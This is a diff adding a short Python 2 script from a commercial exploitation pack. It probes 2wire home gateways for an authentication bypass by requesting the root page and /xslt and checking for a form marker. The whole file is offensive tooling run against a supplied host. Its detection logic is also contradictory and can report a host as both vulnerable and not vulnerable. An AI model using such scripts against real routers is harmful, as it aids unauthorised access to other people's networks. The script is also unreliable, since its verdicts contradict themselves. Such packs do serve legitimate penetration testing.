@@ -1,0 +1,53 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_2wire_2'
+_vendor_ = '2wire'
+_model_  = ['2701HGV-W', '3800HGV-B', '3801HGV']
+_vuln_   = 'Gateway Authentication Bypass'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  try:
+    mark = '<form name="pagepost" method="post" action="/xslt?PAGE=WRA01_POST&amp;NEXTPAGE=WRA01_POST" id="pagepost">'
+    url = "http://%s/" % host
+    response = requests.get(url)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+    return
+  if mark not in response.text:
+    print '[+] %s not vulnerable' % host
+    return
+
+  try:
+    url = "http://%s/xslt" % host
+    response = requests.get(url)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if mark not in response.text:
+    print '[+] %s vulnerable' % host
+  print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
